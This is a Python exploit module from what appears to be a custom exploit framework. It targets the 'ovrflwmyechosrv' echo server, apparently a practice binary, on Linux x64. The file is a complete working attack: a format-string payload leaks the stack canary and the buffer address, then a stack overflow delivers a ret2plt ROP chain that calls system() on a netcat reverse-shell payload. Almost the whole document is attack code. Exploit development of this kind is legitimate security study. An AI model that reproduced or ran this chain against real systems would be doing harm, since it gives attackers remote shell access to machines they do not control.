# Stack Based Buffer Overflow Exploit for ovrflwmyechosrv program
# Return-Oriented-Programming (ROP) PoC to bypass DEP/NX with ret2plt technique
# Plus Format String attack to bypass Canary
"""								EXPLOIT STRUCTURE
+--------------------------------------------------------------------------------+
|           		  Reverse shell payload at buffer's head                     |
+--------------------------------------------------------------------------------+
| 				Padding Trash the size depend on the payload size         		 |
|	 		  Size of (payload + padding) must be exactly 264 bytes		  		 |
+--------------------------------------------------------------------------------+
|		 		 Canary value (obtained with format-string attack) 	  		 	 |
+--------------------------------------------------------------------------------+
|		 				Padding Trash : always 8 bytes							 |
+--------------------------------------------------------------------------------+
|		  					"pop rdi; ret;" gadget address          		 	 |
| Pop the content of the rsp on the top the stack in rdi register and return 	 |
|						It will pop the payload in rdi							 |
+--------------------------------------------------------------------------------+
|		 					Address of the buffer's head 	  		 			 |
+--------------------------------------------------------------------------------+
|								Address of system() function			         |
|				It will call system() with the content of rdi as parameter       |
+--------------------------------------------------------------------------------+
"""

# --------------------------------------- Loading packages... ----------------------------------------#

import struct
import socket
import typing

from pytoolcore import netutils
from core import exploitcore
from payloads import payloadsindex


# ----------------------------------------------------------------------------------------------------#

class Linux64OvrflwmyechosrvExploit(exploitcore.Exploit):

    AUTHOR: str = "Danakane"

    TARGETS: typing.List[str] = [
        "'Linux x64'"
    ]

    def __init__(self) -> None:
        compatibleploads: typing.List[str] = [payloadsindex.PayloadIndex.linux_netcat_reverse]
        params: typing.Dict[str, str] = {
            "target": "The system to exploit",
            "rhost": "The vulnerable remote host",
            "rport": "The remote host port to target"
        }
        super(Linux64OvrflwmyechosrvExploit, self).__init__()
        self.customize(compatibleploads, Linux64OvrflwmyechosrvExploit.TARGETS, params)
        self.__rsockaddr__: typing.Tuple[typing.Any, ...] = ()
        self.configure = self.__doconfig__

    def __doconfig__(self, target: str, rhost: str, rport: str) -> None:
        if not [t for t in self.__targets__ if t.lower() == target.lower()]:
            target = self.targets[0]
        self.target = target
        self.__rsockaddr__ = netutils.getsockinfo(rhost, int(rport))[4]

    def run(self) -> None:
        """ Phase 0 : Preparations """
        offset2canary: int = 264  # number of bytes from buffer to canary
        payload: bytes = self.payloadraw  # the payload to deploy
        padding: bytes = b"\x41" * (offset2canary - len(payload))  # padding trash
        gadgetaddr: bytes = struct.pack("<Q", 0x4005d5)  # "pop rdi; ret;" instruction address
        systemaddr: bytes = struct.pack("<Q", 0x410360)  # system() address

        """ Phase 1 : Connect to target """
        protocol3: int = netutils.host2protocol(self.__rsockaddr__[0])
        atkskt: socket.socket = socket.socket(protocol3, socket.SOCK_STREAM)
        atkskt.connect(self.__rsockaddr__)
        # recv server greet
        print(atkskt.recv(1024).decode("utf-8"), end="")

        """ Step 2 Leak data with format string attack """
        print("Leaking the stack...")
        atkskt.send(b"%p." + b"%llx." * 39 + b"\n")
        leaks = atkskt.recv(2048)
        leaks = leaks.split(b".")
        payloadaddr = struct.pack("<Q", int(leaks[0], 16))  # fixed address, though
        print("buffer is at : " + leaks[0].decode("utf-8"))
        canary = struct.pack("<Q", int(leaks[len(leaks) - 2], 16))
        print("canary value : " + leaks[len(leaks) - 2].decode("utf-8"))

        """ Step 3 build and send the exploit """

        exploit = payload + padding + canary + b"\x41" * 8 + gadgetaddr + payloadaddr + systemaddr + b"\n"
        """		 |	   264 bytes	| 8 bytes|  8 bytes  |	 8 bytes  |	  8 bytes   |  8 bytes   | 1 byte |
                 +------------------+--------+-----------+------------+-------------+------------+--------+
                                                         ^			  ^ 
                                                         |            |
                                                  +-------------------------------+
                                                  | here is the legit ret address |
        """
        print("Sending exploit...")
        print(exploit)
        atkskt.send(exploit)

        # Close the useless socket
        atkskt.close()


blueprint: typing.Callable = Linux64OvrflwmyechosrvExploit
